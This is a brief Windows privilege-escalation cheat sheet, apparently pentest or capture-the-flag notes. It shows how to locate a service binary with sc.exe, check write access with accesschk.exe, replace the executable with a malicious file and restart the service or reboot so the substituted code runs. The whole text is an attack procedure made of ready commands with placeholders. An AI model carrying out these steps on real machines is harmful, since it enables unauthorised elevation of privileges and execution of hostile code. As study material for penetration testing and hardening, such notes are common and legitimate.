First, check the owner and get the path:
```
sc.exe qc SERVICE_NAME
```

Then, check permissions:
```
accesschk.exe /accepteula -quvw SERVICE_PATH
```

If you have `FILE_ALL_ACCESS`, it is exploitable.
Overwrite the executable to exploit:
```
copy MALICIOUS_FULL_PATH ORIGINAL_FULL_PATH
```

Restart the service:
```
net stop SERVICE
net start SERVICE
```
Note: if `net start`/`net stop` cannot be called, reboot the system.
